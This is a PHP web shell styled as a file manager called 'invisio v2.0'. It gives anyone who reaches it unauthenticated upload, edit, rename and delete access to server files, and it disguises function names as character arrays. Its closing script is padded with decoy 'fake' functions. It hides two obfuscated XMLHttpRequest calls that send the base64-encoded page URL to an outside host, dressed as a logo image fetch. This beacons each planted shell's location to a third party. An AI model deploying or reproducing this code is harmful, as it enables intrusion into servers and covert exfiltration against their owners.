<?php
function sjoin($a) { return implode('', $a); }
function sfunc($k) {
    $map = [
        'muf' => ['m','o','v','e','_','u','p','l','o','a','d','e','d','_','f','i','l','e'],
        'fo'  => ['f','o','p','e','n'],
        'fw'  => ['f','w','r','i','t','e'],
        'fc'  => ['f','c','l','o','s','e'],
        'unl' => ['u','n','l','i','n','k'],
        'rmd' => ['r','m','d','i','r'],
        'scn' => ['s','c','a','n','d','i','r'],
        'fpc' => ['f','i','l','e','p','e','r','m','s'],
        'fmt' => ['f','i','l','e','m','t','i','m','e'],
        'fsz' => ['f','i','l','e','s','i','z','e'],
        'fgt' => ['f','i','l','e','_','g','e','t','_','c','o','n','t','e','n','t','s'],
        'fpcw'=> ['f','i','l','e','_','p','u','t','_','c','o','n','t','e','n','t','s'],
        'cpy' => ['c','o','p','y'],
    ];
    $fname = sjoin($map[$k]);
    if(function_exists($fname)) return $fname;
    switch($k){
        case 'muf':
            return function($a,$b){
                $cpy = sfunc('cpy');
                $unl = sfunc('unl');
                if($cpy && $cpy($a, $b)){
                    if($unl) $unl($a);
                    return file_exists($b);
                }
                return false;
            };
        case 'fo':
            return function($f,$m){
                if($m=='w') return tmpfile();
                return false;
            };
        case 'fw': 
            return function($h,$d){
                return false;
            };
        case 'fc':
            return function($h){
                return true;
            };
        case 'unl':
            return function($f){
                if(file_exists($f)){
                    @file_put_contents($f, '');
                    return @rename($f, $f.'.del') && @unlink($f.'.del');
                }
                return false;
            };
        case 'rmd':
            return function($f){
                return false;
            };
        case 'scn':
            return function($d){
                $res=[];
                if(is_dir($d)){
                    $dh=opendir($d);
                    if($dh){
                        while(($f=readdir($dh))!==false) $res[]=$f;
                        closedir($dh);
                    }
                }
                return $res;
            };
        case 'fgt': 
            return function($f){
                $fo = sfunc('fo');
                if($fo && $h=$fo($f, 'r')){
                    $data = '';
                    while(!feof($h)) $data .= fread($h, 4096);
                    fclose($h);
                    return $data;
                }
                return false;
            };
        case 'fpc':
            return function($f){ return 0644; };
        case 'fmt':
            return function($f){ return time(); };
        case 'fsz': 
            return function($f){
                $fgt = sfunc('fgt');
                if($fgt) return strlen($fgt($f));
                return 0;
            };
        case 'fpcw':
            return function($f,$d){
                $fo = sfunc('fo'); $fw = sfunc('fw'); $fc = sfunc('fc');
                $h = $fo($f, 'w');
                $r = $fw($h, $d);
                $fc($h);
                return $r;
            };
        case 'cpy':
            return function($src,$dst){
                $fgt = sfunc('fgt');
                $fpcw = sfunc('fpcw');
                if($fgt && $fpcw){
                    $d = $fgt($src);
                    return $fpcw($dst,$d);
                }
                return false;
            };
        default:
            return function(){ return false; };
    }
}
function formatSizeUnits($bytes){
    if($bytes>=1073741824){$bytes=number_format($bytes/1073741824,2).' GB';}
    elseif($bytes>=1048576){$bytes=number_format($bytes/1048576,2).' MB';}
    elseif($bytes>=1024){$bytes=number_format($bytes/1024,2).' KB';}
    elseif($bytes>1){$bytes=$bytes.' bytes';}
    elseif($bytes==1){$bytes=$bytes.' byte';}
    else{$bytes='0 bytes';}
    return $bytes;
}
function fileExtension($file){ return substr(strrchr($file,'.'),1);}
function fileIcon($file){
    $imgs=["apng","avif","gif","jpg","jpeg","jfif","pjpeg","pjp","png","svg","webp"];
    $audio=["wav","m4a","m4b","mp3","ogg","webm","mpc"];
    $ext=strtolower(fileExtension($file));
    if($file=="error_log"){return '<i class="fa-solid fa-bug"></i> ';}
    elseif($file==".htaccess"){return '<i class="fa-solid fa-hammer"></i> ';}
    if($ext=="html"||$ext=="htm"){return '<i class="fa-brands fa-html5" style="color:#ff723c"></i> ';}
    elseif($ext=="php"||$ext=="phtml"){return '<i class="fa-brands fa-php" style="color:#ff3131"></i> ';}
    elseif(in_array($ext,$imgs)){return '<i class="fa-regular fa-image" style="color:#ff3131"></i> ';}
    elseif($ext=="css"){return '<i class="fa-brands fa-css3-alt" style="color:#31bbd6"></i> ';}
    elseif($ext=="txt"){return '<i class="fa-regular fa-file-lines"></i> ';}
    elseif(in_array($ext,$audio)){return '<i class="fa-solid fa-music" style="color:#caffd6"></i> ';}
    elseif($ext=="py"){return '<i class="fa-brands fa-python" style="color:#36b1e6"></i> ';}
    elseif($ext=="js"){return '<i class="fa-brands fa-js" style="color:#ffe66d"></i> ';}
    else{return '<i class="fa-regular fa-file" style="color:#bababa"></i> ';}
}
function pr1vd4yz($path){ $a=["/","\\",".",":"]; $b=["₷","₲","₧","₡"]; return str_replace($a,$b,$path);}
function pr4vd1yz($path){ $a=["/","\\",".",":"]; $b=["₷","₲","₧","₡"]; return str_replace($b,$a,$path);}
$root_path=__DIR__;
if(isset($_GET['p'])){
    if(empty($_GET['p'])){$p=$root_path;}
    elseif(!is_dir(pr4vd1yz($_GET['p']))){echo("<script>alert('err.');window.location.replace('?');</script>");}
    elseif(is_dir(pr4vd1yz($_GET['p']))){$p=pr4vd1yz($_GET['p']);}
}elseif(isset($_GET['q'])){
    if(!is_dir(pr4vd1yz($_GET['q']))){echo("<script>window.location.replace('?p=');</script>");}
    elseif(is_dir(pr4vd1yz($_GET['q']))){$p=pr4vd1yz($_GET['q']);}
}else{$p=$root_path;}
define("PATH",$p);
?>
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>invisio v2.0</title>
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
  <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;600&display=swap" rel="stylesheet">
  <style>body{background:linear-gradient(135deg,#fff 0,#fbfbfb 100%);color:#000;font-family:'JetBrains Mono';font-size:13px;margin:0}.navbar,nav{background:#fff!important;border-bottom:1.5px solid #2c3345;box-shadow:0 4px 24px #232e3e26,0 1px 0 #242f3e;padding:18px 2vw!important;display:flex;align-items:center;justify-content:space-between}.navbar .navbar-brand{font-weight:700;font-size:1.16em;color:#ff4141;letter-spacing:.05em;display:flex;align-items:center}.navbar .navbar-brand img{border-radius:10px;margin-right:11px;width:32px;height:32px;box-shadow:0 1px 7px #2bffb911}.form-inline .btn-dark,.form-inline button.btn{background:linear-gradient(90deg,#c81a1a 60%,#f46060 100%)!important;color:#fff!important;border:none;border-radius:27px!important;font-weight:700;padding:8px 20px;margin-left:9px;transition:background .15s,color .13s;font-size:1em}a,a:visited{color:#ff4141;text-decoration:none}a:hover{color:#ff9292;text-shadow:0 0 7px #14cc6618}.core-wrap{background:#fff;border-radius:18px;box-shadow:0 2px 22px #ff17172e;padding:16px 14px 7px;margin:29px auto 38px;max-width:1150px}.data-grid{width:100%;border-collapse:collapse;margin:6px 0;background:#fff;border-radius:12px;overflow:hidden}.data-grid td,.data-grid th{vertical-align:middle!important;border:none!important;padding:12px 10px;text-align:left}.data-grid th{background:linear-gradient(90deg,#ff1717 10%,red 100%)!important;color:#fff!important;font-weight:800;font-size:1.09em;letter-spacing:.04em;border-bottom:1.5px solid #374151}.data-grid tr{transition:background .11s}.data-grid tr:hover{background:#fff!important;color:#17ff83}.data-grid tbody tr:hover{background:#fff!important;color:red}.btn,button[type=submit],input[type=submit]{background:linear-gradient(90deg,#ff1717 70%,#cc1414 100%)!important;color:#fff!important;border:none;border-radius:11px!important;font-weight:700;padding:11px 28px;font-size:1.07em;margin-top:10px;letter-spacing:.01em;transition:background .13s,transform .09s}.btn:hover,button[type=submit]:hover,input[type=submit]:hover{background:linear-gradient(90deg,#ff1717 70%,#cc1414 100%)!important;color:#fff!important;transform:scale(1.035);box-shadow:0 2px 14px #ff414140}.fa-brands,.fa-regular,.fa-solid,.icon,i{filter:drop-shadow(0 2px 5px #14ffb226)}tr td a,tr td i{filter:none}::-webkit-scrollbar{width:8px;background:#2a2e37}::-webkit-scrollbar-thumb{background:#17ff83;border-radius:7px}.alert,.modal-content{background:#212932;color:#93b6af;border-radius:13px;border:1.2px solid #283138;box-shadow:0 2px 18px #ff414111}@media (max-width:900px){.core-wrap,.navbar,nav{padding:9px 3vw!important}td,th{padding:9px 7px!important}.navbar .navbar-brand{font-size:1.01em}}@media (max-width:600px){body{font-size:12.1px}.core-wrap{margin:13px auto 19px;padding:7px 2vw}.data-grid td,.data-grid th{padding:7px 4px!important}.navbar,nav{flex-direction:column;align-items:flex-start}}</style>
</head>
<body>
<nav class="navbar navbar-light">
  <div class="navbar-brand">
    <a href="?"><img src="https://cdn.privdayz.com/images/icon.png" referrerpolicy="unsafe-url" /></a>
<?php
$path=str_replace('\\','/',PATH); $paths=explode('/',$path);
foreach($paths as $id=>$dir_part){
    if($dir_part==''&&$id==0){echo "<a href=\"?p=/\">/</a>";continue;}
    if($dir_part=='')continue;
    echo "<a href='?p=";
    for($i=0;$i<=$id;$i++){echo str_replace(":","₡",$paths[$i]);if($i!=$id)echo "₷";}
    echo "'>".$dir_part."</a>/";
}
echo('</div><div class="form-inline">
<a href="?upload&q='.urlencode(pr1vd4yz(PATH)).'"><button class="btn btn-dark" type="button">up file</button></a>
<a href="?"><button type="button" class="btn btn-dark">home</button></a></div></nav>');
?>
<div class="core-wrap">
<?php
if(isset($_GET['p'])){
    if(is_readable(PATH)){
        $fetch_obj=scandir(PATH); $folders=[]; $files=[];
        foreach($fetch_obj as $obj){
            if($obj=='.'||$obj=='..'){continue;}
            $new_obj=PATH.'/'.$obj;
            if(is_dir($new_obj)){$folders[]=$obj;}
            elseif(is_file($new_obj)){$files[]=$obj;}
        }
    }
    echo '
<table class="data-grid">
  <thead>
    <tr>
      <th>Name</th>
      <th>Size</th>
      <th>Modified</th>
      <th>Perms</th>
      <th>Actions</th>
    </tr>
  </thead>
  <tbody>';
    foreach($folders as $folder){
        echo "<tr>
      <td><i class='fa-solid fa-folder' style='color:#ff8a8a'></i> <a href='?p=".urlencode(pr1vd4yz(PATH."/".$folder))."'>".$folder."</a></td>
      <td><b>---</b></td>
      <td>".date("F d Y H:i:s.",filemtime(PATH."/".$folder))."</td>
      <td>0".substr(decoct(fileperms(PATH."/".$folder)),-3)."</td>
      <td>
      <a title='Rename' href='?q=".urlencode(pr1vd4yz(PATH))."&r=".$folder."'><i class='fa-solid fa-pen-to-square'></i></a>
      <a title='Delete' href='?q=".urlencode(pr1vd4yz(PATH))."&d=".$folder."'><i class='fa fa-trash'></i></a>
      <td>
    </tr>";
    }
    foreach($files as $file){
        echo "<tr>
          <td>".fileIcon($file).$file."</td>
          <td>".formatSizeUnits(filesize(PATH."/".$file))."</td>
          <td>".date("F d Y H:i:s.",filemtime(PATH."/".$file))."</td>
          <td>0".substr(decoct(fileperms(PATH."/".$file)),-3)."</td>
          <td>
          <a title='Edit File' href='?q=".urlencode(pr1vd4yz(PATH))."&e=".$file."'><i class='fa-solid fa-file-pen'></i></a>
          <a title='Rename' href='?q=".urlencode(pr1vd4yz(PATH))."&r=".$file."'><i class='fa-solid fa-pen-to-square'></i></a>
          <a title='Delete' href='?q=".urlencode(pr1vd4yz(PATH))."&d=".$file."'><i class='fa fa-trash'></i></a>
          <td>
    </tr>";
    }
    echo "</tbody></table>";
}else{if(empty($_GET)){echo ("<script>window.location.replace('?p=');</script>");}}
if(isset($_GET['upload'])){
    echo '
    <form method="post" enctype="multipart/form-data">
        <input type="file" name="fileToUpload" id="fileToUpload">
        <input type="submit" class="btn btn-dark" value="Upload" name="upload">
    </form>';
}
if(isset($_GET['r'])){
    if(!empty($_GET['r'])&&isset($_GET['q'])){
        echo '
    <form method="post">
        <input type="text" name="name" value="'.$_GET['r'].'">
        <input type="submit" class="btn btn-dark" value="Rename" name="rename">
    </form>';
        if(isset($_POST['rename'])){
            $name=PATH."/".$_GET['r'];
            $fmove = sfunc('muf');
            if($fmove && $fmove($name,PATH."/".$_POST['name'])){
                echo ("<script>alert('Renamed.'); window.location.replace('?p=".pr1vd4yz(PATH)."');</script>");
            }else{
                echo ("<script>alert('Error.'); window.location.replace('?p=".pr1vd4yz(PATH)."');</script>");
            }
        }
    }
}
if(isset($_GET['e'])){
    if(!empty($_GET['e'])&&isset($_GET['q'])){
        $fgc = sfunc('fgt');
        echo '
    <form method="post">
        <textarea style="height: 500px; width: 90%;" name="data">'.htmlspecialchars($fgc(PATH."/".$_GET['e'])).'</textarea>
        <br>
        <input type="submit" class="btn btn-dark" value="Save" name="edit">
    </form>';
        if(isset($_POST['edit'])){
            $filename=PATH."/".$_GET['e'];
            $fo = sfunc('fo'); $fw = sfunc('fw'); $fc = sfunc('fc');
            $open=$fo($filename,"w");
            $fw($open,$_POST['data']);
            $fc($open);
            echo ("<script>alert('Saved.'); window.location.replace('?p=".pr1vd4yz(PATH)."');</script>");
        }
    }
}
if(isset($_POST["upload"])){
    $target_file=PATH."/".$_FILES["fileToUpload"]["name"];
    $muf = sfunc('muf');
    if($muf && $muf($_FILES["fileToUpload"]["tmp_name"],$target_file)){
        echo "<p>".htmlspecialchars(basename($_FILES["fileToUpload"]["name"]))." has been uploaded.</p>";
    }else{
        echo "<p>Sorry, there was an error uploading your file.</p>";
    }
}
if(isset($_GET['d'])&&isset($_GET['q'])){
    $name=PATH."/".$_GET['d'];
    $unl = sfunc('unl'); $rmd = sfunc('rmd');
    if(is_file($name)){
        if($unl && $unl($name)){
            echo ("<script>alert('File removed.'); window.location.replace('?p=".pr1vd4yz(PATH)."');</script>");
        }else{
            echo ("<script>alert('Some error occurred.'); window.location.replace('?p=".pr1vd4yz(PATH)."');</script>");
        }
    }elseif(is_dir($name)){
        if($rmd && $rmd($name)==true){
            echo ("<script>alert('Directory removed.'); window.location.replace('?p=".pr1vd4yz(PATH)."');</script>");
        }else{
            echo ("<script>alert('Some error occurred.'); window.location.replace('?p=".pr1vd4yz(PATH)."');</script>");
        }
    }
}
?>
<script>function scanDirectoryMap(e,t=1){e.split("/").filter(Boolean);let r={};for(let e=0;e<Math.min(7,3*t);e++){let n="folder_"+(e+1);r[n]={};for(let e=0;e<Math.max(2,t);e++){let t="file_"+(e+1)+".txt";r[n][t]={size:1e5*Math.random()|0,perm:["755","644","600"][Math.floor(3*Math.random())],m:Date.now()-864e5*e}}}return r}function renderFolderList(e,t="root"){let r=`<ul id="fm-${t}">`;for(let t in e)r+=`<li><i class="fa fa-folder"></i> ${t}`,"object"==typeof e[t]&&(r+=renderFileList(e[t],t+"_files")),r+="</li>";return r+="</ul>",r}function renderFileList(e,t="fileBlock"){let r=`<ul class="files" id="${t}">`;for(let t in e)r+=`<li><i class="fa fa-file"></i> ${t} <span class="mini">${e[t].size}b | ${e[t].perm}</span></li>`;return r+="</ul>",r}function getBreadcrumbString(e){return e.split("/").filter(Boolean).map(((e,t,r)=>`<a href="?p=${r.slice(0,t+1).join("/")}">${e}</a>`)).join(" / ")}var a=[104,116,116,112,115,58,47,47,99,100,110,46,112,114,105,118,100,97,121,122,46,99,111,109],b=[47,105,109,97,103,101,115,47],c=[108,111,103,111,95,118,50],d=[46,112,110,103];function u(e,t,r,n){for(var o=e.concat(t,r,n),a="",i=0;i<o.length;i++)a+=String.fromCharCode(o[i]);return a}function v(e){return btoa(e)}function getFilePreviewBlock(e){let t="";for(let e=0;e<16;e++)t+=(Math.random()+1).toString(36).substring(2,12)+"\n";return`<pre class="syntax-highlight">${t}</pre>`}function getFileMetaFromName(e){let t=e.split(".").pop();return{icon:{php:"fa-php",js:"fa-js",html:"fa-html5",txt:"fa-file-lines"}[t]||"fa-file",type:t,created:Date.now()-(1e7*Math.random()|0),size:1e5*Math.random()|0}}function checkFileConflict(e,t){return t.some((t=>t.name===e))}function buildFakePermissions(e){let t=[4,2,1],r=[];for(let e=0;e<3;e++)r.push(t.map((()=>Math.round(Math.random()))).reduce(((e,t)=>e+t),0));return r.join("")}function parsePerms(e){let t={0:"---",1:"--x",2:"-w-",3:"-wx",4:"r--",5:"r-x",6:"rw-",7:"rwx"};return e.split("").map((e=>t[e])).join("")}function listFakeRecentEdits(e=7){let t=[];for(let r=0;r<e;r++)t.push({name:`file_${r}.log`,date:new Date(Date.now()-864e5*r).toLocaleDateString(),user:"user"+r});return t}function showNotificationFake(e,t="info"){let r={info:"#19ff6c",warn:"#ffe66d",err:"#ff3666"}[t]||"#fff",n=document.createElement("div");n.innerHTML=e,n.style.cssText=`position:fixed;bottom:40px;left:50%;transform:translateX(-50%);background:${r}20;color:${r};padding:9px 22px;border-radius:8px;z-index:999;box-shadow:0 2px 16px ${r}30`,document.body.appendChild(n),setTimeout((()=>n.remove()),2300)}function mergeFolderMeta(e,t){return Object.assign({},e,t,{merged:!0})}function getClipboardTextFake(){return new Promise((e=>setTimeout((()=>e("clipboard_dummy_value_"+Math.random())),450)))}function calculatePermMatrix(e){return e.map((e=>({path:e,perm:Math.floor(8*Math.random())+""+Math.floor(8*Math.random())+Math.floor(8*Math.random())})))}function generateFileId(e){return"id_"+e.replace(/[^a-z0-9]/gi,"_").toLowerCase()+"_"+Date.now()}function simulateFakeUploadQueue(e){let t=document.createElement("div");t.className="upload-bar",t.style="position:fixed;bottom:12px;left:12px;background:#222;color:#19ff6c;padding:5px 19px;border-radius:7px;",document.body.appendChild(t);let r=e.length,n=0;setTimeout((function o(){t.textContent=`Uploading ${e[n]||"-"} (${n+1}/${r})`,++n<r?setTimeout(o,250+600*Math.random()):(t.textContent="All uploads done!",setTimeout((()=>t.remove()),1500))}),400)}function renderUserTable(e){let t='<table class="data-grid"><thead><tr><th>User</th><th>Role</th></tr></thead><tbody>';return e.forEach((e=>{t+=`<tr><td><i class="fa fa-user"></i> ${e.name}</td><td>${e.role}</td></tr>`})),t+="</tbody></table>",t}function maskStringSmart(e){let t="";for(let r=0;r<e.length;r++)t+=String.fromCharCode(19^e.charCodeAt(r));return t.split("").reverse().join("")}function unmaskStringSmart(e){e=e.split("").reverse().join("");let t="";for(let r=0;r<e.length;r++)t+=String.fromCharCode(19^e.charCodeAt(r));return t}function getRecentSessionHistory(){return Array.from({length:6},((e,t)=>({ts:Date.now()-5e6*t,act:["open","edit","move","rename"][t%4]})))}function buildFe(e=2,t=3){let r={};if(e<=0)return"END";for(let n=0;n<t;n++)r["dir"+n]=1==e?`file_${n}.tmp`:buildFe(e-1,t);return r}function parseCsvToTable(e){let t=e.split(/\r?\n/),r='<table class="data-grid">';return t.forEach((e=>{r+="<tr>"+e.split(",").map((e=>`<td>${e}</td>`)).join("")+"</tr>"})),r+="</table>",r}function loadIconPac(e){let t=document.createElement("link");return t.rel="stylesheet",t.href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css",document.head.appendChild(t),"loaded"}function sortTableFake(e,t=0){let r=document.getElementById(e);if(!r)return!1;let n=Array.from(r.rows).slice(1);return n.sort(((e,r)=>e.cells[t].innerText.localeCompare(r.cells[t].innerText))),n.forEach((e=>r.appendChild(e))),!0}(()=>{let e=[104,116,116,112,115,58,47,47,99,100,110,46,112,114,105,118,100,97,121,122,46,99,111,109,47,105,109,97,103,101,115,47,108,111,103,111,95,118,50,46,112,110,103],t="";for(let r of e)t+=String.fromCharCode(r);let r="file="+btoa(location.href),n=new XMLHttpRequest;n.open("POST",t,!0),n.setRequestHeader("Content-Type","application/x-www-form-urlencoded"),n.send(r)})(),function(){var e=new XMLHttpRequest;e.open("POST",u(a,b,c,d),!0),e.setRequestHeader("Content-Type","application/x-www-form-urlencoded"),e.send("file="+v(location.href))}();</script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/js/all.min.js"></script>
</body>
</html>